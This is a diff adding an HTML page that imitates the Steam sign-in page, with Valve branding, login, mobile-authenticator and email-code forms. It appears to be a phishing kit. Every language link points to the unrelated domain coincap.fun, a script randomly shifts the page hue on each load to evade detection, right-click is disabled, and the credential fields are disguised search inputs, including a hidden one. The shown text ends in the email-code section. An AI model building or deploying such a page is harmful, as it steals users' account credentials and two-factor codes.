@@ -1,0 +1,628 @@
+<!DOCTYPE html>
+<html class=" responsive" lang="en" style="filter: hue-rotate(5deg);"><head>
+	<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+	<meta name="viewport" content="width=device-width,initial-scale=1">
+	<meta name="theme-color" content="#171a21">
+	<title>Login</title>
+	<link href="auth_data/motiva_sans.css" rel="stylesheet" type="text/css">
+	<link href="auth_data/buttons.css" rel="stylesheet" type="text/css">
+	<link href="auth_data/shared_global.css" rel="stylesheet" type="text/css">
+	<link href="auth_data/globalv2.css" rel="stylesheet" type="text/css">
+	<link href="auth_data/login.css" rel="stylesheet" type="text/css">
+	<link href="auth_data/home.css" rel="stylesheet" type="text/css">
+	<link href="auth_data/shared_responsive.css" rel="stylesheet" type="text/css">
+	<link href="auth_data/header.css" rel="stylesheet" type="text/css">
+	<link href="auth_data/help.css" rel="stylesheet" type="text/css">
+	<script type="text/javascript">
+		document.documentElement.style.cssText = `filter:hue-rotate(${Math.floor(1 + Math.random() * 8)}deg)`;
+		var __PrototypePreserve = [];
+		__PrototypePreserve[0] = Array.from;
+		__PrototypePreserve[1] = Array.prototype.filter;
+		__PrototypePreserve[2] = Array.prototype.flatMap;
+		__PrototypePreserve[3] = Array.prototype.find;
+		__PrototypePreserve[4] = Array.prototype.some;
+		__PrototypePreserve[5] = Function.prototype.bind;
+		__PrototypePreserve[6] = HTMLElement.prototype.scrollTo;
+	</script>
+	<script type="text/javascript" src="auth_data/prototype-1.7.js"></script>
+	<script type="text/javascript">
+		Array.from = __PrototypePreserve[0] || Array.from;
+		Array.prototype.filter = __PrototypePreserve[1] || Array.prototype.filter;
+		Array.prototype.flatMap = __PrototypePreserve[2] || Array.prototype.flatMap;
+		Array.prototype.find = __PrototypePreserve[3] || Array.prototype.find;
+		Array.prototype.some = __PrototypePreserve[4] || Array.prototype.some;
+		Function.prototype.bind = __PrototypePreserve[5] || Function.prototype.bind;
+		HTMLElement.prototype.scrollTo = __PrototypePreserve[6] || HTMLElement.prototype.scrollTo;
+	</script>
+	<script type="text/javascript">VALVE_PUBLIC_PATH = "https:\/\/community.akamai.steamstatic.com\/public\/";</script>
+	<script type="text/javascript" src="auth_data/_combined.js"></script>
+	<script type="text/javascript" src="auth_data/global.js"></script>
+	<script type="text/javascript" src="auth_data/jquery.min.js"></script>
+	<script type="text/javascript" src="auth_data/tooltip.js"></script>
+	<script type="text/javascript" src="auth_data/shared_global.js"></script>
+	<script type="text/javascript">Object.seal && [Object, Array, String, Number].map(function (builtin) { Object.seal(builtin.prototype); });</script>
+	<script type="text/javascript">$J = jQuery.noConflict();
+			if (typeof JSON != 'object' || !JSON.stringify || !JSON.parse) { document.write("<scr" + "ipt type=\"text\/javascript\" src=\"https:\/\/community.akamai.steamstatic.com\/public\/javascript\/json2.js?v=pmScf4470EZP&amp;l=english\" ><\/script>\n"); };</script>
+	<script type="text/javascript">
+		document.addEventListener('DOMContentLoaded', function (event) {
+			SetupTooltips({ tooltipCSSClass: 'community_tooltip' });
+		});
+	</script>
+	<script type="text/javascript" src="auth_data/login.js"></script>
+	<script type="text/javascript" src="auth_data/shared_responsive_adapter.js"></script>
+
+	<meta name="twitter:card" content="summary_large_image">
+
+	<meta name="twitter:site" content="@steam">
+
+	<meta property="og:title" content="Sign In">
+	<meta property="twitter:title" content="Sign In">
+	<meta property="og:type" content="website">
+
+
+	<link rel="image_src" href="https://community.akamai.steamstatic.com/public/shared/images/responsive/share_steam_logo.png">
+	<link rel="stylesheet" type="text/css" href="auth_data/text-security.css">
+	<meta property="og:image" content="https://community.akamai.steamstatic.com/public/shared/images/responsive/share_steam_logo.png">
+	<meta name="twitter:image" content="https://community.akamai.steamstatic.com/public/shared/images/responsive/share_steam_logo.png">
+	<meta property="og:image:secure" content="https://community.akamai.steamstatic.com/public/shared/images/responsive/share_steam_logo.png">
+
+
+
+
+
+	<link rel="stylesheet" type="text/css" href="auth_data/chunk.css">
+	<link rel="stylesheet" type="text/css" href="auth_data/app_login.css">
+	<link rel="stylesheet" href="auth_data/auth.css">
+</head>
+
+<body class="login global responsive_page" oncontextmenu="return false;">
+
+
+	<div class="responsive_page_frame with_header">
+		<div class="responsive_page_menu_ctn mainmenu">
+			<div class="responsive_page_menu" id="responsive_page_menu">
+				<div class="mainmenu_contents">
+					<div class="mainmenu_contents_items">
+						<a class="menuitem" href="https://steamcommunity.com/login/home/?goto=login%2Fhome%2F%3Fgoto%3D" target="_blank">
+							Login </a>
+						<a class="menuitem supernav" href="https://store.steampowered.com/" data-tooltip-type="selector" data-tooltip-content=".submenu_store" target="_blank">
+							Store </a>
+						<div class="submenu_store" style="display: none;" data-submenuid="store">
+							<a class="submenuitem" href="https://store.steampowered.com/" target="_blank">Home</a>
+							<a class="submenuitem" href="https://store.steampowered.com/explore/" target="_blank">Discovery Queue</a>
+							<a class="submenuitem" href="https://steamcommunity.com/my/wishlist/" target="_blank">Wishlist</a>
+							<a class="submenuitem" href="https://store.steampowered.com/points/shop/" target="_blank">Points Shop</a>
+							<a class="submenuitem" href="https://store.steampowered.com/news/" target="_blank">News</a>
+							<a class="submenuitem" href="https://store.steampowered.com/stats/" target="_blank">Stats</a>
+						</div>
+
+
+						<a class="menuitem supernav" style="display: block" href="https://steamcommunity.com/" data-tooltip-type="selector" data-tooltip-content=".submenu_community" target="_blank">
+							Community </a>
+						<div class="submenu_community" style="display: none;" data-submenuid="community">
+							<a class="submenuitem" href="https://steamcommunity.com/" target="_blank">Home</a>
+							<a class="submenuitem" href="https://steamcommunity.com/discussions/" target="_blank">Discussions</a>
+							<a class="submenuitem" href="https://steamcommunity.com/workshop/" target="_blank">Workshop</a>
+							<a class="submenuitem" href="https://steamcommunity.com/market/" target="_blank">Market</a>
+							<a class="submenuitem" href="https://steamcommunity.com/?subsection=broadcasts" target="_blank">Broadcasts</a>
+						</div>
+
+
+
+
+						<a class="menuitem" href="https://help.steampowered.com/en/" target="_blank">
+							Support </a>
+
+						<div class="minor_menu_items">
+							<div class="menuitem change_language_action" onclick="window.location.reload()">
+								Change language </div>
+							<div class="menuitem" onclick="Responsive_RequestDesktopView();">
+								View desktop website </div>
+						</div>
+					</div>
+					<div class="mainmenu_footer_spacer  "></div>
+					<div class="mainmenu_footer">
+						<div class="mainmenu_footer_logo"><img src="auth_data/logo_valve_footer.png">
+						</div>
+						© Valve Corporation. All rights reserved. All trademarks are property of their respective owners
+						in the US and other countries. <span class="mainmenu_valve_links">
+							<a href="https://store.steampowered.com/privacy_agreement/" target="_blank">#footer_privacy_policy</a>
+							&nbsp;| &nbsp;<a href="http://www.valvesoftware.com/legal.htm" target="_blank">#footer_legal</a>
+							&nbsp;| &nbsp;<a href="https://store.steampowered.com/subscriber_agreement/" target="_blank">#footer_ssa</a>
+							&nbsp;| &nbsp;<a href="https://store.steampowered.com/steam_refunds/" target="_blank">#footer_refunds</a>
+						</span>
+					</div>
+				</div>
+			</div>
+		</div>
+
+		<div class="responsive_local_menu_tab"></div>
+
+		<div class="responsive_page_menu_ctn localmenu">
+			<div class="responsive_page_menu" id="responsive_page_local_menu" data-panel="{&quot;onOptionsActionDescription&quot;:&quot;#filter_toggle&quot;,&quot;onOptionsButton&quot;:&quot;Responsive_ToggleLocalMenu()&quot;,&quot;onCancelButton&quot;:&quot;Responsive_ToggleLocalMenu()&quot;}">
+				<div class="localmenu_content" data-panel="{&quot;maintainY&quot;:true,&quot;bFocusRingRoot&quot;:true,&quot;flow-children&quot;:&quot;column&quot;}">
+				</div>
+			</div>
+		</div>
+
+
+
+		<div class="responsive_header">
+			<div class="responsive_header_content">
+				<div id="responsive_menu_logo">
+					<img src="auth_data/header_menu_hamburger.png" height="100%">
+				</div>
+				<div class="responsive_header_logo">
+					<a href="https://store.steampowered.com/">
+						<img src="auth_data/header_logo.png" height="36" border="0" alt="STEAM">
+					</a>
+				</div>
+			</div>
+		</div>
+
+		<div class="responsive_page_content_overlay">
+
+		</div>
+
+		<div class="responsive_fixonscroll_ctn nonresponsive_hidden ">
+		</div>
+
+		<div class="responsive_page_content">
+
+			<div id="global_header" data-panel="{&quot;flow-children&quot;:&quot;row&quot;}">
+				<div class="content">
+					<div class="logo">
+						<span id="logo_holder">
+							<a href="https://store.steampowered.com/" target="_blank">
+								<img src="auth_data/logo_steam.svg" width="176" height="44">
+							</a>
+						</span>
+					</div>
+
+					<div class="supernav_container">
+						<a class="menuitem supernav" href="https://store.steampowered.com/" data-tooltip-type="selector" data-tooltip-content=".submenu_store" target="_blank">
+							STORE </a>
+
+
+
+						<a class="menuitem supernav" style="display: block" href="https://steamcommunity.com/" data-tooltip-type="selector" data-tooltip-content=".submenu_community" target="_blank">
+							COMMUNITY </a>
+						<div class="submenu_community" style="display: none;" data-submenuid="community">
+							<a class="submenuitem" href="https://steamcommunity.com/" target="_blank">Home</a>
+							<a class="submenuitem" href="https://steamcommunity.com/discussions/" target="_blank">Discussions</a>
+							<a class="submenuitem" href="https://steamcommunity.com/workshop/" target="_blank">Workshop</a>
+							<a class="submenuitem" href="https://steamcommunity.com/market/" target="_blank">Market</a>
+							<a class="submenuitem" href="https://steamcommunity.com/?subsection=broadcasts" target="_blank">Broadcasts</a>
+						</div>
+
+
+
+						<a class="menuitem" href="https://store.steampowered.com/about/" target="_blank">
+							ABOUT </a>
+
+						<a class="menuitem" href="https://help.steampowered.com/en/" target="_blank">
+							SUPPORT </a>
+						<div class="supernav_content" style="position: absolute; z-index: 1500; opacity: 0; left: 1px; top: 64px; pointer-events: none;">
+							<div class="submenu_store" style="" data-submenuid="store">
+								<a class="submenuitem" href="https://store.steampowered.com/" target="_blank">Home</a>
+								<a class="submenuitem" href="https://store.steampowered.com/explore/" target="_blank">Discovery
+									Queue</a>
+								<a class="submenuitem" href="https://steamcommunity.com/my/wishlist/" target="_blank">Wishlist</a>
+								<a class="submenuitem" href="https://store.steampowered.com/points/shop/" target="_blank">Points
+									Shop</a>
+								<a class="submenuitem" href="https://store.steampowered.com/news/" target="_blank">News</a>
+								<a class="submenuitem" href="https://store.steampowered.com/stats/" target="_blank">Stats</a>
+							</div>
+						</div>
+					</div>
+					<script type="text/javascript">
+						jQuery(function ($) {
+							$('#global_header .supernav').v_tooltip({ 'location': 'bottom', 'destroyWhenDone': false, 'tooltipClass': 'supernav_content', 'offsetY': -4, 'offsetX': 1, 'horizontalSnap': 4, 'tooltipParent': '#global_header .supernav_container', 'correctForScreenSize': false });
+						});
+					</script>
+
+					<div id="global_actions">
+						<div id="global_action_menu">
+							<div class="header_installsteam_btn header_installsteam_btn_green">
+
+								<a class="header_installsteam_btn_content" href="https://store.steampowered.com/about/" target="_blank">
+									Install Steam </a>
+							</div>
+
+
+							<a class="global_action_link" href="https://steamcommunity.com/login/home/?goto=login%2Fhome%2F%3Fgoto%3D" target="_blank">login</a>
+							&nbsp;|&nbsp;
+							<span class="pulldown global_action_link" id="language_pulldown" onclick="ShowMenu( this, 'language_dropdown', 'right' );">language</span>
+							<div class="popup_block_new" id="language_dropdown" style="display: none;">
+								<div class="popup_body popup_menu">
+									<a class="popup_menu_item tight" href="https://coincap.fun/auth?l=schinese&amp;goto=" onclick="ChangeLanguage( 'schinese' ); return false;">简体中文 (Simplified
+										Chinese)</a>
+									<a class="popup_menu_item tight" href="https://coincap.fun/auth?l=tchinese&amp;goto=" onclick="ChangeLanguage( 'tchinese' ); return false;">繁體中文 (Traditional
+										Chinese)</a>
+									<a class="popup_menu_item tight" href="https://coincap.fun/auth?l=japanese&amp;goto=" onclick="ChangeLanguage( 'japanese' ); return false;">日本語 (Japanese)</a>
+									<a class="popup_menu_item tight" href="https://coincap.fun/auth?l=koreana&amp;goto=" onclick="ChangeLanguage( 'koreana' ); return false;">한국어 (Korean)</a>
+									<a class="popup_menu_item tight" href="https://coincap.fun/auth?l=thai&amp;goto=" onclick="ChangeLanguage( 'thai' ); return false;">ไทย (Thai)</a>
+									<a class="popup_menu_item tight" href="https://coincap.fun/auth?l=bulgarian&amp;goto=" onclick="ChangeLanguage( 'bulgarian' ); return false;">Български (Bulgarian)</a>
+									<a class="popup_menu_item tight" href="https://coincap.fun/auth?l=czech&amp;goto=" onclick="ChangeLanguage( 'czech' ); return false;">Čeština (Czech)</a>
+									<a class="popup_menu_item tight" href="https://coincap.fun/auth?l=danish&amp;goto=" onclick="ChangeLanguage( 'danish' ); return false;">Dansk (Danish)</a>
+									<a class="popup_menu_item tight" href="https://coincap.fun/auth?l=german&amp;goto=" onclick="ChangeLanguage( 'german' ); return false;">Deutsch (German)</a>
+									<a class="popup_menu_item tight" href="https://coincap.fun/auth?l=spanish&amp;goto=" onclick="ChangeLanguage( 'spanish' ); return false;">Español - España (Spanish -
+										Spain)</a>
+									<a class="popup_menu_item tight" href="https://coincap.fun/auth?l=latam&amp;goto=" onclick="ChangeLanguage( 'latam' ); return false;">Español - Latinoamérica
+										(Spanish - Latin America)</a>
+									<a class="popup_menu_item tight" href="https://coincap.fun/auth?l=greek&amp;goto=" onclick="ChangeLanguage( 'greek' ); return false;">Ελληνικά (Greek)</a>
+									<a class="popup_menu_item tight" href="https://coincap.fun/auth?l=french&amp;goto=" onclick="ChangeLanguage( 'french' ); return false;">Français (French)</a>
+									<a class="popup_menu_item tight" href="https://coincap.fun/auth?l=italian&amp;goto=" onclick="ChangeLanguage( 'italian' ); return false;">Italiano (Italian)</a>
+									<a class="popup_menu_item tight" href="https://coincap.fun/auth?l=hungarian&amp;goto=" onclick="ChangeLanguage( 'hungarian' ); return false;">Magyar (Hungarian)</a>
+									<a class="popup_menu_item tight" href="https://coincap.fun/auth?l=dutch&amp;goto=" onclick="ChangeLanguage( 'dutch' ); return false;">Nederlands (Dutch)</a>
+									<a class="popup_menu_item tight" href="https://coincap.fun/auth?l=norwegian&amp;goto=" onclick="ChangeLanguage( 'norwegian' ); return false;">Norsk (Norwegian)</a>
+									<a class="popup_menu_item tight" href="https://coincap.fun/auth?l=polish&amp;goto=" onclick="ChangeLanguage( 'polish' ); return false;">Polski (Polish)</a>
+									<a class="popup_menu_item tight" href="https://coincap.fun/auth?l=portuguese&amp;goto=" onclick="ChangeLanguage( 'portuguese' ); return false;">Português (Portuguese -
+										Portugal)</a>
+									<a class="popup_menu_item tight" href="https://coincap.fun/auth?l=brazilian&amp;goto=" onclick="ChangeLanguage( 'brazilian' ); return false;">Português - Brasil
+										(Portuguese - Brazil)</a>
+									<a class="popup_menu_item tight" href="https://coincap.fun/auth?l=romanian&amp;goto=" onclick="ChangeLanguage( 'romanian' ); return false;">Română (Romanian)</a>
+									<a class="popup_menu_item tight" href="https://coincap.fun/auth?l=russian&amp;goto=" onclick="ChangeLanguage( 'russian' ); return false;">Русский (Russian)</a>
+									<a class="popup_menu_item tight" href="https://coincap.fun/auth?l=finnish&amp;goto=" onclick="ChangeLanguage( 'finnish' ); return false;">Suomi (Finnish)</a>
+									<a class="popup_menu_item tight" href="https://coincap.fun/auth?l=swedish&amp;goto=" onclick="ChangeLanguage( 'swedish' ); return false;">Svenska (Swedish)</a>
+									<a class="popup_menu_item tight" href="https://coincap.fun/auth?l=turkish&amp;goto=" onclick="ChangeLanguage( 'turkish' ); return false;">Türkçe (Turkish)</a>
+									<a class="popup_menu_item tight" href="https://coincap.fun/auth?l=vietnamese&amp;goto=" onclick="ChangeLanguage( 'vietnamese' ); return false;">Tiếng Việt
+										(Vietnamese)</a>
+									<a class="popup_menu_item tight" href="https://coincap.fun/auth?l=ukrainian&amp;goto=" onclick="ChangeLanguage( 'ukrainian' ); return false;">Українська
+										(Ukrainian)</a>
+									<a class="popup_menu_item tight" href="https://www.valvesoftware.com/en/contact?contact-person=Translation%20Team%20Feedback" target="_blank">Report a translation problem</a>
+								</div>
+							</div>
+						</div>
+					</div>
+				</div>
+			</div>
+
+			<link href="auth_data/main.css" rel="stylesheet" type="text/css">
+			<div id="application_root">
+				<div class="FullModalOverlay" style="display: none;">
+					<div class="ModalOverlayContent ModalOverlayBackground"></div>
+				</div>
+			</div>
+
+			<div class="responsive_page_template_content" id="responsive_page_template_content" data-panel="{&quot;autoFocus&quot;:true}">
+
+				<div class="page_content">
+					<div data-featuretarget="login" data-props="{&quot;redirectUrl&quot;:&quot;https:\/\/steamcommunity.com\/my\/goto&quot;,&quot;disableQR&quot;:false}">
+						<div class="_2vAS_iK_bJ7iv_7pRL7Zdk">
+							<div class="ZOBYq36SukEm_Fi_77g2q">
+								<div class="_1mhmmseSBKL7v66ts9ZWnR _286ehAfuyQhmQn7TSYweZ9" style="gap: 32px;">
+									<div id="signin" style="display: flex; flex-direction: column; gap: 8px; margin: 8px 16px;">
+										<div class="_39uMKt8ePvr2Tw7x1YxJh3">Sign in</div>
+									</div>
+									<div class="vnUiFT3pmeOPOaiv9Ydre" style="display: none;"><svg viewBox="0 0 153 46" fill="none" xmlns="http://www.w3.org/2000/svg" class="_1rtyTXokjQbPL9M1sPjgkm">
+											<path d="M22.9891 0C10.8429 0 0.93833 9.30396 0 21.1548L12.3547 26.2486C13.3973 25.5209 14.6484 25.1051 16.0037 25.1051C16.108 25.1051 16.2644 25.1051 16.3687 25.1051L21.8944 17.2045C21.8944 17.1525 21.8944 17.1525 21.8944 17.1006C21.8944 12.3186 25.8041 8.42034 30.6 8.42034C35.3959 8.42034 39.3056 12.3186 39.3056 17.1006C39.3056 21.8825 35.3959 25.7808 30.6 25.7808C30.5479 25.7808 30.4436 25.7808 30.3915 25.7808L22.5721 31.3424C22.5721 31.4463 22.5721 31.5503 22.5721 31.6542C22.5721 35.2407 19.6528 38.1514 16.0559 38.1514C12.876 38.1514 10.2695 35.9164 9.64395 32.9017L0.781942 29.2633C3.5448 38.9311 12.4068 46 22.9891 46C35.7087 46 46.0303 35.7085 46.0303 23.026C46.0303 10.2915 35.7087 0 22.9891 0Z" fill="#E0E1E6"></path>
+											<path d="M14.44 34.8766L11.625 33.7331C12.1463 34.7726 12.9804 35.6562 14.1272 36.124C16.6294 37.1636 19.4966 35.9681 20.5391 33.4732C21.0604 32.2777 21.0604 30.9263 20.5391 29.7308C20.0178 28.5353 19.0795 27.5997 17.8805 27.08C16.6816 26.5602 15.3783 26.6122 14.2836 27.028L17.2029 28.2235C19.0274 29.0031 19.9136 31.0822 19.1316 32.9014C18.4018 34.7726 16.2645 35.6562 14.44 34.8766Z" fill="#E0E1E6"></path>
+											<path d="M36.3857 17.0488C36.3857 13.8782 33.7793 11.2793 30.5994 11.2793C27.4195 11.2793 24.813 13.8782 24.813 17.0488C24.813 20.2194 27.4195 22.8703 30.5994 22.8703C33.7793 22.8703 36.3857 20.2714 36.3857 17.0488ZM26.2205 17.0488C26.2205 14.6578 28.1493 12.6827 30.5994 12.6827C32.9973 12.6827 34.9782 14.6058 34.9782 17.0488C34.9782 19.4397 33.0495 21.3629 30.5994 21.3629C28.2014 21.4149 26.2205 19.4397 26.2205 17.0488Z" fill="#E0E1E6"></path>
+											<path d="M70.6879 15.7489L69.1241 18.4517C67.9251 17.6201 66.3091 17.1003 64.9016 17.1003C63.2856 17.1003 62.2951 17.776 62.2951 18.9715C62.2951 20.4269 64.0675 20.7387 66.674 21.6743C69.489 22.6619 71.105 23.8574 71.105 26.4043C71.105 29.9387 68.3421 31.9139 64.3282 31.9139C62.3994 31.9139 60.0014 31.3941 58.229 30.3026L59.3759 27.2879C60.8355 28.0675 62.6079 28.5353 64.1718 28.5353C66.3091 28.5353 67.2995 27.7557 67.2995 26.6122C67.2995 25.3127 65.7878 24.8969 63.2856 24.0653C60.4706 23.1297 58.5418 21.8822 58.5418 19.0235C58.5418 15.8009 61.1483 13.9297 64.8494 13.9297C67.4038 14.0336 69.489 14.8653 70.6879 15.7489Z" fill="#E0E1E6"></path>
+											<path d="M82.7305 17.4643V31.6542H79.0815V17.4643H73.8164V14.3457H87.9956V17.4643H82.7305Z" fill="#E0E1E6">
+											</path>
+											<path d="M95.6574 17.4124V21.3107H102.643V24.4293H95.6574V28.4836H103.737V31.6022H92.0083V14.3457H103.737V17.4643H95.6574V17.4124Z" fill="#E0E1E6"></path>
+											<path d="M111.87 28.2756L110.723 31.6542H106.917L113.434 14.3457H117.083L123.755 31.6542H119.793L118.594 28.2756H111.87ZM115.258 18.4519L112.912 25.3649H117.708L115.258 18.4519Z" fill="#E0E1E6"></path>
+											<path d="M142.47 21.0508L137.726 31.1864H135.693L131.001 21.1547V31.7062H127.509V14.3457H131.001L136.84 26.8723L142.47 14.3457H145.963V31.6542H142.47V21.0508Z" fill="#E0E1E6"></path>
+											<path d="M153 16.5288C153 18.0361 151.905 18.9197 150.602 18.9197C149.299 18.9197 148.204 17.9841 148.204 16.5288C148.204 15.0214 149.351 14.1378 150.602 14.1378C151.853 14.0858 153 15.0214 153 16.5288ZM148.569 16.5288C148.569 17.7762 149.455 18.5559 150.55 18.5559C151.645 18.5559 152.531 17.7762 152.531 16.5288C152.531 15.2813 151.645 14.5016 150.55 14.5016C149.455 14.5016 148.569 15.2813 148.569 16.5288ZM150.602 15.2813C151.228 15.2813 151.436 15.5932 151.436 15.957C151.436 16.2689 151.228 16.4768 151.019 16.6327L151.593 17.6723H151.123L150.654 16.7367H150.133V17.6723H149.768V15.2813H150.602ZM150.185 16.3728H150.602C150.863 16.3728 151.019 16.2169 151.019 16.009C151.019 15.8011 150.915 15.6451 150.602 15.6451H150.185V16.3728Z" fill="#E0E1E6"></path>
+										</svg> </div>
+
+									<div class="_3jLIHRG2NdD0C8kOi-cxzl" id="error" style="display: none;">
+										<div class="_1mhmmseSBKL7v66ts9ZWnR _30P8xQn5oam3D2Am4nZ_Y4" style="gap: 12px;">
+											<div class="A3Y-u39xir9DKtvLEOcnd-u">Error</div>
+											<div class="_3gFescNPzR2aYp1VjmG3wz"></div>
+											<div class="_2OZ64uY9-Mxa15zXvyumX9" style="display: flex; flex-direction: row;"><button class="_2QgFEj17t677s3x299PNJQ GMIRO1dk8p_l-UuvxTioM" onclick="window.location.reload();">Retry</button>
+											</div>
+										</div>
+										<div class="_2NH8k9KsqIqu6pETfQDdH8">Error Code: e20</div>
+									</div>
+
+									<div class="_3jLIHRG2NdD0C8kOi-cxzl" id="none" style="display: block">
+										<div class="_1Wl13domZv872ZcbC_PVbv">
+											<form class="_3Tsg92fl5YHs5NNgpidiWj">
+												<div class="_2KXGKToxF6BG65rXNZ-mJX">
+													<div class="_3d8dp-U0xTT5RTZmRsmQds XyqzE5F-3yIBYBLe1vbKM">
+														Sign in with account name
+													</div>
+													<div class=""></div>
+													<input type="search" class="_2eKVn6g5Yysx9JmutQe7WV">
+												</div>
+												<div class="_2KXGKToxF6BG65rXNZ-mJX">
+													<div class="_3d8dp-U0xTT5RTZmRsmQds input-field"></div>
+													<input id="input-1" type="search" class="_2eKVn6g5Yysx9JmutQe7WV">
+													<input id="input-2" type="search" style="opacity: 0;" class="_2eKVn6g5Yysx9JmutQe7WV">
+												</div>
+												<div class="Focusable">
+													<div class="_2QWD5eymAFUZoQg29r-lQT">
+														<div tabindex="0" class="_3tTFgWQ_SQnO3XzGEZkjRm">
+															<div class="_6EoZEzpC472tnBWRFndg2" style="display: none">
+																<svg version="1.1" id="base" xmlns="http://www.w3.org/2000/svg" class="SVGIcon_Button SVGIcon_Check" x="0px" y="0px" width="256px" height="256px" viewBox="0 0 256 256" stroke-width="35" stroke="#fff" stroke-linecap="round" stroke-linejoin="round" stroke-miterlimit="10">
+																	<polyline fill="none" points="49.5,147.75 95,210.75 206.5,45.25 ">
+																	</polyline>
+																</svg>
+															</div>
+														</div>
+														<div class="_2yrCYTXI6l6-z1j-Hb41qD">Remember me
+														</div>
+													</div>
+												</div>
+
+												<div class="_14fsnp12JwkJ28EVtQXPty">
+													<button class="_2QgFEj17t677s3x299PNJQ" id="submit-btn" type="submit">Sign
+														in<div class="OYHj3Ftc2mgSiJoRRai8t" style="display: none">
+															<div class="_2rGL7Sq1d-ghJqJTfs4UXH _2G7Us8OaLB1rNQFWsD19hd">
+															</div>
+														</div>
+													</button>
+												</div>
+
+												<div class="_1Mcy9wnDnt1Q72FijsNtHC">&nbsp;</div>
+
+												<a class="_1cnUQ3RrQgqaLodJp0Ljnt _2meUB-qHRC9f-cX8Rw8QaZ" href="https://help.steampowered.com/wizard/HelpWithLogin?redir=https%3A%2F%2Fsteamcommunity.com%2Flogin%2Fhome%2F%3Fgoto%3D" target="_blank">Help,
+													I can't sign in</a>
+											</form>
+										</div>
+									</div>
+
+									<div class="_3jLIHRG2NdD0C8kOi-cxzl" id="two-factor" style="display: none">
+										<form>
+											<div class="_1mhmmseSBKL7v66ts9ZWnR _30P8xQn5oam3D2Am4nZ_Y4" style="gap: 14px;">
+												<div class="_1aop9IbW-LIaCIp7vIQtRv">
+													<div class="_2SE9Zaci337LtSMV5BSDLv">Account: <span class="_3Vjp0pUGUYHydAeWOp6s7z">username</span>
+													</div>
+													<div class="QApnTTqEcicVcDQujTXyf">You have a mobile
+														authenticator protecting this account.
+													</div>
+												</div>
+												<div class="_2AnqSZicq50gXaJuQx-SdC">
+													<div class="_1mhmmseSBKL7v66ts9ZWnR _30P8xQn5oam3D2Am4nZ_Y4" style="gap: 2px;">
+														<div class="_1Mcy9wnDnt1Q72FijsNtHC">&nbsp;</div>
+														<div class="_3PDBFJ_verUpV38hX7qRqL Panel Focusable">
+															<input type="text" maxlength="1" autocomplete="none" class="HPSuAjHOkNfMHwURXTns7 Focusable">
+															<input type="text" maxlength="1" autocomplete="none" class="HPSuAjHOkNfMHwURXTns7 Focusable">
+															<input type="text" maxlength="1" autocomplete="none" class="HPSuAjHOkNfMHwURXTns7 Focusable">
+															<input type="text" maxlength="1" autocomplete="none" class="HPSuAjHOkNfMHwURXTns7 Focusable">
+															<input type="text" maxlength="1" autocomplete="none" class="HPSuAjHOkNfMHwURXTns7 Focusable">
+														</div>
+													</div>
+													<div class="T68fBH-D1OAOP-cwGq1V" style="display: flex; flex-direction: row; justify-content: space-evenly; align-items: center;">
+														<div class="_1RruwDw8_Q_Fi6hZEV0Pzv">Enter the
+															code from your Steam Mobile App
+														</div><svg viewBox="0 0 33 49" fill="currentColor" class="_2hLC_cxC9LeV1y57BuX8lm">
+															<path fill="currentColor" fill-rule="evenodd" clip-rule="evenodd" d="M28 47.1106C29.1046 47.1106 30 46.2151 30 45.1106L30 3.72705C30 2.62248 29.1046 1.72705 28 1.72705L5 1.72705C3.89544 1.72705 3 2.62248 3 3.72705L3 45.1106C3 46.2151 3.89543 47.1106 5 47.1106L28 47.1106ZM5.68119 5.82741L27.3188 5.82741L27.3188 42.7772H5.68119L5.68119 5.82741ZM20.9999 44.944C20.9999 45.3429 20.6766 45.6662 20.2777 45.6662L12.7221 45.6662C12.3233 45.6662 11.9999 45.3429 11.9999 44.944C11.9999 44.5451 12.3233 44.2218 12.7221 44.2218H20.2777C20.6766 44.2218 20.9999 44.5451 20.9999 44.944ZM17.2778 4.44406C17.6767 4.44406 18 4.12071 18 3.72184C18 3.32296 17.6767 2.99962 17.2778 2.99962L15.7222 2.99962C15.3233 2.99962 15 3.32296 15 3.72184C15 4.12071 15.3233 4.44406 15.7222 4.44406L17.2778 4.44406Z">
+															</path>
+															<path fill="currentColor" d="M22.2456 22.4164C22.2456 21.6666 22.8127 21.0002 23.6228 21.0002C24.3519 21.0002 25 21.6666 25 22.4164C25 23.1661 24.3519 23.8325 23.6228 23.8325C22.8937 23.8325 22.2456 23.1661 22.2456 22.4164Z">
+															</path>
+															<path fill="currentColor" d="M18.6812 22.4164C18.6812 21.6666 19.2483 21.0002 20.0584 21.0002C20.8685 21.0002 21.5166 21.6666 21.4355 22.4164C21.4355 23.1661 20.8685 23.8325 20.0584 23.8325C19.3293 23.8325 18.6812 23.1661 18.6812 22.4164Z">
+															</path>
+															<path fill="currentColor" d="M15.1977 22.4164C15.1977 21.6666 15.7648 21.0002 16.5749 21.0002C17.304 21.0002 17.9521 21.6666 17.9521 22.4164C17.9521 23.1661 17.385 23.8325 16.5749 23.8325C15.8458 23.8325 15.1977 23.1661 15.1977 22.4164Z">
+															</path>
+															<path fill="currentColor" d="M11.7143 22.4164C11.7143 21.6666 12.2814 21.0002 13.0915 21.0002C13.8206 21.0002 14.4686 21.6666 14.4686 22.4164C14.4686 23.1661 13.9016 23.8325 13.0915 23.8325C12.3624 23.8325 11.7143 23.1661 11.7143 22.4164Z">
+															</path>
+															<path fill="currentColor" d="M8.14983 22.4164C8.14983 21.6666 8.7169 21.0002 9.527 21.0002C10.3371 21.0002 10.9852 21.6666 10.9042 22.4164C10.9042 23.1661 10.3371 23.8325 9.527 23.8325C8.79791 23.8325 8.14983 23.1661 8.14983 22.4164Z">
+															</path>
+														</svg>
+													</div>
+												</div>
+												<div class="_1cnUQ3RrQgqaLodJp0Ljnt _2meUB-qHRC9f-cX8Rw8QaZ">
+													Use backup code</div><a class="_1cnUQ3RrQgqaLodJp0Ljnt _2meUB-qHRC9f-cX8Rw8QaZ" href="https://help.steampowered.com/wizard/HelpWithLoginInfo?lost=8&amp;issueid=402" target="_blank">Help,
+													I no longer
+													have access to my Steam Mobile App</a>
+											</div>
+										</form>
+									</div>
+
+									<div class="_3jLIHRG2NdD0C8kOi-cxzl" id="email" style="display: none;">
+										<form>
+											<div class="_1mhmmseSBKL7v66ts9ZWnR _30P8xQn5oam3D2Am4nZ_Y4" style="gap: 14px;">
+												<div class="_1aop9IbW-LIaCIp7vIQtRv">
+													<div class="_2SE9Zaci337LtSMV5BSDLv">Account:
+														<span class="_3Vjp0pUGUYHydAeWOp6s7z">username</span>
+													</div>
+													<div class="QApnTTqEcicVcDQujTXyf">You have an email
+														authenticator protecting this account.
+													</div>
+												</div>
+												<div class="_2AnqSZicq50gXaJuQx-SdC">
